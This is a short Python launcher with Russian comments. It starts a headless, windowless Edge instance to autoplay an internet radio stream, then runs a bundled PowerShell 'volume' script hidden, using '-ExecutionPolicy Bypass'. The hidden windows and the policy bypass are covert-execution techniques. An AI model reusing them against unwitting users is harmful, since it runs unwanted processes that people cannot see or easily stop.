import subprocess
import os
import sys

def main():
    # 1. Запускаем Edge скрыто
    subprocess.Popen(['msedge.exe', '--headless=new', '--disable-gpu', '--autoplay-policy=no-user-gesture-required', 'https://main.hostingradio.ru:80/rock-256'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

    # 2. Запускаем наш скрипт громкости скрыто
    script_path = os.path.join(sys._MEIPASS, 'script.ps1') if getattr(sys, 'frozen', False) else 'script.ps1'
    
    subprocess.Popen(['powershell.exe', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', script_path], creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == '__main__':
    main()
